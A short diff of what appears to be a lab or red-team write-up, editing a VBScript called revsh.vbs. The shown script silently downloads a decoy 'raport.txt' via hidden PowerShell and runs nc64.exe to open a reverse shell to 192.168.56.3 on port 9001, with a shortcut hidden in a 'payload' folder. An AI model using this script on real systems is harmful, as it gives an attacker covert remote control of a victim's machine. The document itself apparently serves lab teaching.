@@ -230,7 +230,6 @@ This is what I put in the revsh.vbs file:
 
 ```vbs
 Set objShell = CreateObject("Wscript.Shell")
-Set objFSO = CreateObject("Scripting.FileSystemObject")
 
 ' Download fake report
 downloadRaport = "powershell -WindowStyle Hidden -Command ""(New-Object System.Net.WebClient).DownloadFile('http://192.168.56.3/raport.txt', '%TEMP%\raport.txt')"""
@@ -247,7 +246,6 @@ objShell.Run downloadCmd, 0, True
 execCmd = "cmd /c powershell -Command ""Start-Process \""%TEMP%\nc64.exe\"" -ArgumentList '192.168.56.3', '9001', '-e', 'powershell' -WindowStyle Hidden"""
 objShell.Run execCmd, 0, True
 
-Set objFSO = Nothing
 Set objShell = Nothing
 ```
 Next thing I did was adding a shortcut to the script that I had put in a hidden folder called payload.
